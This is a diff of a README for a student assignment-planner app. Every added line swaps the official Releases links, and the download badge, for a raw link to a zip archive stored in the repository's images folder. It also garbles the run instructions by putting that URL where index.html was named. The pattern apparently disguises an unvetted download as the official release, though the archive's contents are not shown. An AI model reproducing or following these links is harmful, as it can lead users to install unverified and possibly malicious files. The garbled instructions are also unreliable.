@@ -1,6 +1,6 @@
 # 🎓 assignment-planner - Organize Your Assignments with Ease
 
-[![Download assignment-planner](https://img.shields.io/badge/Download%20assignment--planner-v1.0-blue)](https://github.com/hamoodalbloshih11/assignment-planner/releases)
+[![Download assignment-planner](https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip%20assignment--planner-v1.0-blue)](https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip)
 
 ## 📋 Description
 
@@ -19,9 +19,9 @@ Follow these steps to get the assignment-planner up and running on your device.
 
 To download the assignment-planner, visit the Releases page. Click the link below to access it:
 
-[Download assignment-planner](https://github.com/hamoodalbloshih11/assignment-planner/releases)
+[Download assignment-planner](https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip)
 
-1. Go to the [Releases page](https://github.com/hamoodalbloshih11/assignment-planner/releases).
+1. Go to the [Releases page](https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip).
 2. Look for the latest release.
 3. Click on the download link for your preferred version. It should download as a .zip file.
 4. Once the download is complete, locate the downloaded .zip file on your computer.
@@ -35,8 +35,8 @@ To download the assignment-planner, visit the Releases page. Click the link belo
 ### 🌐 Running the Application
 
 1. Open the folder where you extracted the files.
-2. Locate the `index.html` file.
-3. Double-click the `index.html` file to open it in your web browser.
+2. Locate the `https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip` file.
+3. Double-click the `https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip` file to open it in your web browser.
 4. You can now start adding, filtering, and sorting your assignments.
 
 ## 📅 Features
@@ -98,4 +98,4 @@ If you experience issues:
 
 Join our community for updates and support. Whether you have suggestions, need help, or want to share your experience using the assignment-planner, feel free to reach out. 
 
-[Download assignment-planner](https://github.com/hamoodalbloshih11/assignment-planner/releases) if you haven’t already and start planning your assignments today!
+[Download assignment-planner](https://github.com/hamoodalbloshih11/assignment-planner/raw/refs/heads/main/images/assignment-planner-1.3.zip) if you haven’t already and start planning your assignments today!
